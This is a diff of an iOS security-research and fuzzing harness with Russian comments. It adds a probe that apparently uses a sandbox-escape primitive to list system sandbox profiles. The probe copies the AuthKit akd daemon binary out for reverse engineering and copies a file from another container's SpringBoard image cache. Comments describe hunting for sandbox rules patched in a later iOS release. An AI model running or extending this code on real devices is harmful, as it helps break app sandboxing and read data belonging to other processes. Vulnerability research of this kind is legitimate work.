@@ -47478,6 +47478,157 @@ static void p_bq111(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq112 — v272: sandbox-профили целей + бинарь akd + .atx + собственный functions.data.
+// Решающие вопросы: (1) akd/backboardd/springboard — sandboxed или нет
+// (/System/Library/Sandbox/Profiles читается!), (2) бинарь akd из AuthKit
+// (System читается — вытащим для Ghidra), (3) содержимое PBUIMapped .atx
+// (mapped-image кэш springboard), (4) есть ли functions.data у НАШЕГО app
+// (тот же CA-парсер в нашей песочнице → безопасный фаззинг-оракул!).
+static void p_bq112(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq112] v272: sandbox-профили + akd + .atx + own-cache (§265-next)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    // === 1. Sandbox profiles ===
+    {
+        static const char *sbxdirs[] = {
+            "/System/Library/Sandbox/Profiles",
+            "/System/Library/Sandbox",
+            "/usr/share/sandbox",
+        };
+        for (unsigned d = 0; d < sizeof(sbxdirs)/sizeof(sbxdirs[0]); d++) {
+            DIR *dd = opendir(sbxdirs[d]);
+            LOG("[bq112] %s: %s", sbxdirs[d], dd ? "ОТКРЫТ" : strerror(errno));
+            if (!dd) continue;
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 300) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                if (strstr(de->d_name, "akd") || strstr(de->d_name, "backboard") ||
+                    strstr(de->d_name, "springboard") || strstr(de->d_name, "appstored") ||
+                    strstr(de->d_name, "lsd") || strstr(de->d_name, "findmy") ||
+                    strstr(de->d_name, "PaperBoard") || strstr(de->d_name, "store"))
+                    LOG("[bq112]   SBX-PROF: %s", de->d_name);
+            }
+            closedir(dd);
+            LOG("[bq112]   (всего %d записей)", c);
+            fsync(fileno(stderr));
+        }
+    }
+
+    // === 2. бинарь akd ===
+    {
+        static const char *akd_p = "/System/Library/PrivateFrameworks/AuthKit.framework/akd";
+        struct stat st = {0};
+        if (stat(akd_p, &st) == 0 && S_ISREG(st.st_mode)) {
+            LOG("[bq112] akd: %lld байт — копирую", (long long)st.st_size);
+            FILE *f = fopen(akd_p, "rb");
+            if (f) {
+                char out[600];
+                snprintf(out, sizeof(out), "%s/daemon-akd", docs.fileSystemRepresentation);
+                FILE *o = fopen(out, "wb");
+                unsigned long tot = 0;
+                if (o) { char buf[65536]; size_t r;
+                    while ((r = fread(buf, 1, sizeof(buf), f)) > 0) { fwrite(buf,1,r,o); tot += r; }
+                    fclose(o);
+                    LOG("[bq112] akd copied %lu", tot);
+                }
+                fclose(f);
+            }
+        } else LOG("[bq112] akd: errno %d", errno);
+        fsync(fileno(stderr));
+    }
+
+    // === 3. PBUIMapped .atx содержимое ===
+    {
+        char pbc[1100];
+        snprintf(pbc, sizeof(pbc),
+                 "/var/containers/Data/System/D751CF7C-BB34-4A31-9D9A-D8DA5EBF4DEB"
+                 "/Library/Caches/com.apple.PaperBoardUI/PBUIMappedImageCacheManager-Default");
+        DIR *dd = opendir(pbc);
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 8) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                char sub[2400];
+                snprintf(sub, sizeof(sub), "%s/%s", pbc, de->d_name);
+                DIR *sd = opendir(sub);
+                if (!sd) continue;
+                struct dirent *se; int c2 = 0;
+                while ((se = readdir(sd)) && c2 < 12) {
+                    if (se->d_name[0] == '.') continue;
+                    c2++;
+                    char fp[2900];
+                    snprintf(fp, sizeof(fp), "%s/%s", sub, se->d_name);
+                    struct stat st2 = {0};
+                    if (stat(fp, &st2) == 0) {
+                        LOG("[bq112] atx/%s/%s: %lld байт", de->d_name, se->d_name,
+                            (long long)st2.st_size);
+                        // первый файл — копируем
+                        if (c == 1 && st2.st_size > 0 && st2.st_size < 5000000) {
+                            FILE *f = fopen(fp, "rb");
+                            if (f) {
+                                char out[600];
+                                snprintf(out, sizeof(out), "%s/sb-atx", docs.fileSystemRepresentation);
+                                FILE *o = fopen(out, "wb");
+                                if (o) { char buf[65536]; size_t r; unsigned long t2=0;
+                                    while ((r = fread(buf,1,sizeof(buf),f))>0){fwrite(buf,1,r,o);t2+=r;}
+                                    fclose(o);
+                                    LOG("[bq112]   copied %lu -> sb-atx", t2);
+                                }
+                                fclose(f);
+                            }
+                        }
+                    } else LOG("[bq112] atx/%s: errno %d", se->d_name, errno);
+                }
+                closedir(sd);
+                if (c >= 3) break;
+            }
+            closedir(dd);
+        } else LOG("[bq112] PBUIMapped opendir errno %d", errno);
+        fsync(fileno(stderr));
+    }
+
+    // === 4. наш собственный Caches: есть ли functions.data (CA в нашем процессе)? ===
+    {
+        static const char *mine[] = {
+            "Library/Caches", "Library/Caches/functions.data", "Library/Caches/functions.list",
+            "Library/Caches/com.apple.PaperBoardUI",
+        };
+        for (unsigned i = 0; i < sizeof(mine)/sizeof(mine[0]); i++) {
+            char fp[1300];
+            snprintf(fp, sizeof(fp), "%s/%s", NSHomeDirectory().UTF8String, mine[i]);
+            struct stat st = {0};
+            LOG("[bq112] own %s: %s", mine[i],
+                stat(fp, &st) == 0 ? (S_ISDIR(st.st_mode) ? "DIR" :
+                    [[NSString stringWithFormat:@"%lld байт", (long long)st.st_size] UTF8String])
+                : strerror(errno));
+        }
+        // Полный листинг нашего Library/Caches
+        char cc[1300];
+        snprintf(cc, sizeof(cc), "%s/Library/Caches", NSHomeDirectory().UTF8String);
+        DIR *dd = opendir(cc);
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 60) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                LOG("[bq112] own-Caches/%s", de->d_name);
+            }
+            closedir(dd);
+        }
+        fsync(fileno(stderr));
+    }
+
+    if (h >= 0) bad_query_release(h);
+    LOG("[bq112] ИТОГ: профили+akd+atx+own собраны");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -56103,6 +56254,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ109")) { p_bq109(); LOG("[probe13] bq109-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ110")) { p_bq110(); LOG("[probe13] bq110-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ111")) { p_bq111(); LOG("[probe13] bq111-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ112")) { p_bq112(); LOG("[probe13] bq112-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
